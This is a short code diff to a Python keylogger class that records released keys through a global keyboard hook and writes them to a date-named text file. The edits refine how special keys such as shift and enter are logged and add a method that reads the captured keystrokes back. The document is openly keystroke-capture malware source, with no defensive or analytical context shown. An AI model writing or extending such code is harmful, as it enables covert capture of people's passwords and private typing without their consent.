@@ -18,9 +18,11 @@ class Keylogger:
                 name = '\nENTER\n'
             elif name == 'decimal':
                 name = '.'
+            elif name == 'shift':
+                pass
             else:
                 name = name.replace(' ', '_')
-                name = f' {name.upper()} '
+                name = f'\n{name.upper()}\n'
         self.log += name
         self.write_log(self.log)
         self.log = ''
@@ -32,6 +34,10 @@ class Keylogger:
         else:
             with open(f'{self.date}.txt', 'w') as file:
                 file.write(log)
+                
+    def read_log(self) -> str:
+        with open(f'{self.date}.txt', 'r') as file:
+            return file.read()
 
     def start(self) -> None:
         keyboard.on_release(callback=self.callback)
